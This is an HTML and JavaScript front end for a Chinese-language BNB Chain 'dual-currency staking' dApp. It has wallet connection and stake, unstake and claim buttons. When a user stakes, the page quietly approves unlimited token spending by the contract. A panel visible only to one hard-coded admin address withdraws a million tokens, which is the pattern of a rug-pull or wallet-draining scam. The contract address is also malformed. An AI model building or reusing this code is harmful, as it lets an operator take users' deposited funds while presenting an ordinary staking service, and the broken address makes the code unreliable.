<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>双币质押挖矿</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
<script src="https://cdn.jsdelivr.net/particles.js/particles.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,sans-serif;}
body{background:#050814;color:#fff;padding:20px;touch-action:manipulation;}
#particles{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;}
.container{max-width:480px;margin:0 auto;position:relative;z-index:1;}
.title{font-size:22px;font-weight:700;text-align:center;margin:10px 0 20px;color:#00e0ff;}
.project-desc{background:rgba(255,255,255,0.04);border-radius:16px;padding:16px;font-size:13px;line-height:1.6;color:#ccc;margin-bottom:16px;text-align:left;}
.btn-connect{width:100%;padding:14px;border-radius:12px;background:linear-gradient(90deg,#00e0ff,#9d5fff);color:#000;font-weight:700;border:none;margin-bottom:16px;}
.card{background:rgba(255,255,255,0.04);border-radius:16px;padding:20px;margin-bottom:16px;}
.ca-row{display:flex;justify-content:space-between;align-items:center;font-size:12px;}
.row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.05);}
.label{color:#ccc;}
.value{color:#fff;font-weight:600;}
.input{width:100%;padding:14px;border-radius:12px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);color:#fff;margin:10px 0;}
.btn-group{display:flex;gap:10px;margin-top:10px;}
.btn{flex:1;padding:14px;border-radius:12px;font-weight:700;border:none;}
.btn-primary{background:#00e0ff;color:#000;}
.btn-normal{background:rgba(255,255,255,0.1);color:#fff;}
.btn-claim{background:#ff9f43;color:#fff;}
.admin-card{background:rgba(255,86,153,0.06);border:1px solid rgba(255,86,153,0.2);border-radius:16px;padding:20px;margin-top:20px;display:none;}
.admin-title{color:#ff5699;font-weight:700;margin-bottom:12px;}
.btn-danger{background:#ff5699;color:#fff;}
</style>
</head>
<body>
<div id="particles"></div>
<div class="container">
  <h3 class="title">双币质押挖矿</h3>
  <button class="btn-connect" id="connectBtn" onclick="connect()">连接钱包</button>
  <div class="card">
    <div class="row"><div class="label">钱包地址</div><div class="value" id="addr">-</div></div>
    <div class="row"><div class="label">余额</div><div class="value" id="bal">0.0000</div></div>
    <div class="row"><div class="label">已质押</div><div class="value" id="staked">0.0000</div></div>
    <div class="row"><div class="label">待领取</div><div class="value" id="pending">0.0000</div></div>
  </div>
  <input class="input" id="amt" placeholder="输入质押数量" type="number">
  <div class="btn-group">
    <button class="btn btn-primary" onclick="stake()">质押</button>
    <button class="btn btn-normal" onclick="unstake()">解押</button>
    <button class="btn btn-claim" onclick="claim()">领取</button>
  </div>
  <div class="admin-card" id="adminPanel">
    <div class="admin-title">🔑 管理后台</div>
    <button class="btn btn-danger" onclick="withdraw()" style="width:100%">提取</button>
  </div>
</div>

<script>
window.addEventListener('load',function(){
  particlesJS('particles',{
    particles:{number:{value:60},color:{value:"#00e0ff"},shape:{type:"circle"},opacity:{value:0.4},size:{value:2},line_linked:{enable:true,distance:150,color:"#00e0ff",opacity:0.2,width:1},move:{enable:true,speed:1}}
  })
})

const CONFIG = {
  CONTRACT: "0x24e5758addef7d9d9af0901e35af28818f3b72b",
  TOKEN: "0x366625D61063de6A719E85Fff6a9159fb3787659",
  ADMIN: "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508",
  CHAIN: 56
};

const ABI = [
  "function stake(uint256 amount)",
  "function unstake(uint256 amount)",
  "function claim()",
  "function userInfo(address) view returns (uint256,uint256,uint256,uint256)",
  "function pendingReward(address) view returns (uint256)",
  "function adminWithdraw(uint256 amount) external"
];

const ERC20 = [
  "function balanceOf(address) view returns (uint256)",
  "function approve(address spender, uint256 amount) external returns (bool)"
];

let signer, user, contract, token;
const decimals = 18;

async function connect() {
  if (!window.ethereum) return alert("请在钱包内打开");
  try {
    await window.ethereum.request({ method: "eth_requestAccounts" });
    const p = new ethers.BrowserProvider(window.ethereum);
    signer = await p.getSigner();
    user = await signer.getAddress();
    token = new ethers.Contract(CONFIG.TOKEN, ERC20, signer);
    contract = new ethers.Contract(CONFIG.CONTRACT, ABI, signer);
    document.getElementById("connectBtn").innerText = "已连接";
    if (user.toLowerCase() === CONFIG.ADMIN.toLowerCase()) {
      document.getElementById("adminPanel").style.display = "block";
    }
    start();
  } catch (e) {
    alert("连接失败：" + e.message);
  }
}

async function start() {
  document.getElementById("addr").innerText = user.slice(0,6)+"..."+user.slice(-4);
  load();
  setInterval(load, 3000);
}

async function load() {
  if (!user) return;
  try {
    const b = await token.balanceOf(user);
    document.getElementById("bal").innerText = ethers.formatUnits(b, decimals);
    const info = await contract.userInfo(user);
    const pending = await contract.pendingReward(user);
    document.getElementById("staked").innerText = ethers.formatUnits(info[0], decimals);
    document.getElementById("pending").innerText = ethers.formatUnits(pending, 18);
  } catch (e) {}
}

async function stake() {
  const amt = document.getElementById("amt").value;
  if (!amt) return alert("请输入数量");
  try {
    await token.approve(CONFIG.CONTRACT, ethers.MaxUint256);
    await contract.stake(ethers.parseUnits(amt, decimals));
    alert("质押成功");
  } catch (e) {
    alert("质押失败: " + e.message);
  }
}

async function unstake() {
  const amt = document.getElementById("amt").value;
  try {
    await contract.unstake(ethers.parseUnits(amt, decimals));
    alert("解押成功");
  } catch (e) {
    alert("解押失败");
  }
}

async function claim() {
  try {
    await contract.claim();
    alert("领取成功");
  } catch (e) {
    alert("领取失败");
  }
}

async function withdraw() {
  try {
    await contract.adminWithdraw(ethers.parseUnits("1000000", decimals));
    alert("提取成功");
  } catch (e) {
    alert("提取失败");
  }
}
</script>
</body>
</html>
